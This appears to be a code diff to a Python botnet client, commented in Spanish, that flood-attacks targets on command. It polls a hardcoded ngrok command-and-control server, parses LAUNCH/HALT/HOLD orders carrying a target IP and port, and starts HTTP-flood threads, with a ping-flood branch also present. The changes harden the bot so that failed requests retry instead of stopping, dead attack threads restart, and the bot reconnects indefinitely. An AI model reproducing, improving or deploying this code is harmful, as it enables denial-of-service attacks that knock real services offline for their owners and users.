@@ -28,20 +28,25 @@ class lauchLoad:
 		self._running = False
       
 	def run(self, n):
-		run = 0
-		#terminate = 0
-		if n[3]=="HTTPFLOOD":
-			while self._running and statusSet:
-				receiving_url = 'http://'+n[0]+':'+n[1]+'/'
-				try:
-					urllib.request.urlopen(receiving_url, timeout=100).read()
-				except urllib.error.URLError as e:
-					print(f"❌ Error conectando a {receiving_url}: {e}")
-					return  # Salir del thread
-				except Exception as e:
-					print(f"❌ Error inesperado: {e}")
-					return
-				#time.sleep(int(n[4]))
+		global statusSet
+		try:
+			if n[3] == "HTTPFLOOD":
+				receiving_url = 'http://' + n[0] + ':' + n[1] + '/'
+				
+				while self._running and statusSet:
+					try:
+						urllib.request.urlopen(receiving_url, timeout=10).read()
+					except urllib.error.URLError as e:
+						print(f"❌ Error en request: {e}")
+						time.sleep(2)  # Breve pausa antes de reintentar
+						continue  # ← CONTINUAR, no return
+					except Exception as e:
+						print(f"❌ Error inesperado: {e}")
+						time.sleep(2)
+						continue  # ← CONTINUAR, no return
+		finally:
+			print("🛑 Thread de ataque terminado")
+			statusSet = 0  # ← RESETEAR al terminar
 
 		if n[3]=="PINGFLOOD":
 			while self._running:
@@ -79,86 +84,91 @@ def connect_with_retry(host, port):
 
 
 def Main():
-
-	#Flags
-	global statusSet
-	statusSet = 0
-	global updated
-	updated = 0
-	global terminate
-	terminate = 0
-
-
-	host = '0.tcp.sa.ngrok.io' #server
-	port = 15170 
-
-	s = connect_with_retry(host,port)
-
-	# ✅ Verificar si la conexión fue exitosa
-	if s is None:
-		print("❌ No se pudo establecer conexión. Reintentando...")
-		time.sleep(15)
-		Main()
-		return
+    # Flags
+    global statusSet
+    statusSet = 0
+    global updated
+    updated = 0
+    global terminate
+    terminate = 0
     
-    # ✅ Si llegamos aquí, ya estamos conectados
-	message = "HEARTBEAT"
+    t = None  # ← Definir fuera del if
 
-	try:
-		while True:
-			try:
-				s.send(message.encode())	
-				time.sleep(5)
-			except Exception as e:
-				print(f"❌ Error enviando mensaje: {e}")
-				break # Salir del while y reconectar
-		
-			data = s.recv(1024)
+    host = '0.tcp.sa.ngrok.io'
+    port = 15170 
 
-			print('Response:',str(data.decode())) # Response: LAUNCH
+    s = connect_with_retry(host, port)
 
-			data = str(data.decode())
-			data = data.split('_')
-			#print('server Response: ', data)  # ['167.172.229.50', '3000', 'LAUNCH', 'HTTPFLOOD', '0']
-			if len(data) > 1:
-				runStatus = data[2]
-			else:
-				runStatus = "OFFLINE"
-			
+    if s is None:
+        print("❌ No se pudo establecer conexión. Reintentando...")
+        time.sleep(15)
+        Main()
+        return
+    
+    message = "HEARTBEAT"
 
-			print('Response: ', runStatus)
-		
-			if runStatus == "LAUNCH":
-				if statusSet == 0:
-					# start a new thread and starts a new process
-					statusSet = 1
-					c = lauchLoad()
-					t = threading.Thread(target = c.run, args =(data, ))
-					t.start()
-					
-				else:
-					time.sleep(15)
-					if t.is_alive():
-						print('Connecting...')
-				continue
-			elif runStatus == "HALT":
-				statusSet = 0
-				time.sleep(30)
-				continue
-			elif runStatus == "HOLD":
-				statusSet = 0
-				print('Waiting for Instructions from server. Retrying in 30 seconds...')
-				time.sleep(30)
-			else:
-				statusSet = 0
-				print('Server Offline. Retrying in 30 seconds...')
-				updated = 0
-				time.sleep(30)
-	finally:
-		s.close()  # ← Ahora cierra DESPUÉS del while
-		print("🔌 Conexión cerrada. Reconectando...")
-		time.sleep(5)
-		Main() 
+    try:
+        while True:
+            try:
+                s.send(message.encode())	
+                time.sleep(5)
+            except Exception as e:
+                print(f"❌ Error enviando mensaje: {e}")
+                break
+        
+            data = s.recv(1024)
+            print('Response:', str(data.decode()))
+
+            data = str(data.decode())
+            data = data.split('_')
+            
+            if len(data) > 1:
+                runStatus = data[2]
+            else:
+                runStatus = "OFFLINE"
+            
+            print('Response:', runStatus)
+        
+            if runStatus == "LAUNCH":
+                # ✅ Verificar si necesitamos crear/recrear thread
+                if t is None or not t.is_alive():
+                    if t is not None:
+                        print('⚠️  Thread anterior murió, reiniciando...')
+                    
+                    statusSet = 1
+                    c = lauchLoad()
+                    t = threading.Thread(target=c.run, args=(data,))
+                    t.daemon = True  # ← Importante
+                    t.start()
+                    print("✅ Thread de ataque iniciado")
+                else:
+                    print('Connecting...')  # ← Ahora SÍ aparecerá
+                
+            elif runStatus == "HALT":
+                if statusSet == 1:
+                    print("🛑 Deteniendo ataque...")
+                    statusSet = 0
+                    if t and t.is_alive():
+                        t.join(timeout=2)  # Esperar a que termine
+                
+            elif runStatus == "HOLD":
+                statusSet = 0
+                print('Waiting for Instructions from server.')
+                
+            else:
+                statusSet = 0
+                print('Server Offline.')
+                
+    finally:
+        if t and t.is_alive():
+            statusSet = 0
+            print("Esperando a que termine el thread...")
+            t.join(timeout=5)
+        
+        s.close()
+        print("🔌 Conexión cerrada. Reconectando...")
+        time.sleep(5)
+        Main()
 	
 
 if __name__ == '__main__':
